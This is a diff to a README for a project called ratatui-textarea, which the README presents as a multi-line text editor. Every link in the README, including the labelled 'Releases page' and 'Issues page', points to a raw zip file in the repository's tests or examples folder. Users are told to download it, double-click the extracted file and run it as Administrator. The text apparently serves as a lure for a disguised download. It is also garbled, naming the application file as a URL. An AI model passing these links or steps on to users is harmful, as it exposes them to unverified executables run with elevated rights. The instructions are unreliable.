@@ -1,7 +1,7 @@
 # ✏️ ratatui-textarea - A Simple Multi-Line Text Editor
 
 ## 📥 Download Now
-[![Download ratatui-textarea](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip)](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip)
+[![Download ratatui-textarea](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip)](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip)
 
 ## 🚀 Getting Started
 Ratatui-textarea is a simple yet powerful multi-line text editor designed for easy use. It provides a clean interface and allows you to write and edit text smoothly. Follow these steps to download and run the application.
@@ -15,14 +15,14 @@ Ratatui-textarea is a simple yet powerful multi-line text editor designed for ea
 ## 📂 Download & Install
 To get started, visit the Releases page to download the latest version of ratatui-textarea.
 
-[Visit the Releases Page to Download](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip)
+[Visit the Releases Page to Download](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip)
 
 ### Step 1: Visit the Releases Page
-1. Click on the link above or type it in your browser: [https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip).
+1. Click on the link above or type it in your browser: [https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip).
    
 ### Step 2: Download the Latest Version
 1. On the Releases page, look for the latest version of ratatui-textarea.
-2. Click on the link labeled with the version number to download the file. It may be named something like `https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip` or `https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip`.
+2. Click on the link labeled with the version number to download the file. It may be named something like `https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip` or `https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip`.
 
 ### Step 3: Unzip (if necessary)
 1. If you downloaded a ZIP file, locate the file in your downloads folder.
@@ -30,7 +30,7 @@ To get started, visit the Releases page to download the latest version of ratatu
 
 ### Step 4: Run the Application
 1. After unzipping, open the folder containing the extracted files.
-2. Look for the application file, which will be named `https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip`.
+2. Look for the application file, which will be named `https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip`.
 3. Double-click the application file to start the editor.
 
 ## ⚙️ Features
@@ -52,7 +52,7 @@ If you encounter any issues during installation or usage, consider the following
 3. **Run as Administrator (Windows):** If you face permission issues, right-click on the application and select "Run as Administrator."
 
 ## 📞 Support
-For any questions or further assistance, please visit our [GitHub Issues Page](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip). You can report problems or ask for help there.
+For any questions or further assistance, please visit our [GitHub Issues Page](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip). You can report problems or ask for help there.
 
 ## 📄 License
 Ratatui-textarea is released under the MIT License. You can use, copy, and modify it as you like. Please see the LICENSE file in the repository for more details.
@@ -60,4 +60,4 @@ Ratatui-textarea is released under the MIT License. You can use, copy, and modif
 ## 📢 Updates
 Keep an eye on the Releases page for new updates. We continuously improve the application based on user feedback and feature requests.
 
-[Download ratatui-textarea](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/tests/ratatui_textarea_3.3.zip) and start editing your text with ease!
+[Download ratatui-textarea](https://github.com/abosoufmohammed/ratatui-textarea/raw/refs/heads/main/examples/textarea-ratatui-3.5.zip) and start editing your text with ease!
